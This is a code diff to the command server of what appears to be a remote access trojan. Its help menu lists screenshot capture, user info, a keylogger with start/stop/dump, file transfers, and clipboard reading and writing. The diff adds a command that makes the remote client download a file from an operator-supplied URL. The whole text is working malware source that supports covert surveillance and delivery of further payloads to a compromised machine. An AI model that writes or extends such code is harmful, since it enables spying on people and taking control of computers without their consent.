@@ -25,9 +25,10 @@ interface_help = """
 --g | Grabs a screenshot
 --u | User Info
 --k (start) (stop) (dump) | Manage Keylogger
---s (file) | Transfers file to Client
---r (file) | Transfers file to Server
---c (Text) | Copies to Client Clipboard
+--s | Transfers file to Client
+--r | Transfers file to Server
+--d | Download file from the web
+--c | Copies to Client Clipboard
 --p | Returns Client Current Clipboard
 --b | Run Connection in Background"""
 
@@ -380,6 +381,14 @@ class MultiServer(object):
                     continue
             if '--p' in command:
                 self.send(conn, b'<PASTE>')
+                self.receive(conn)
+                continue
+            if '--d' in command:
+                file_to_download = input('File to Download: ')
+                file_name = input('Filename: ')
+                self.send(conn, b'<DOWNLOAD>')
+                self.receive(conn, _print=False)
+                self.send(conn, pickle.dumps({'filename': file_name, 'url': file_to_download}))
                 self.receive(conn)
                 continue
             if '--s' in command:
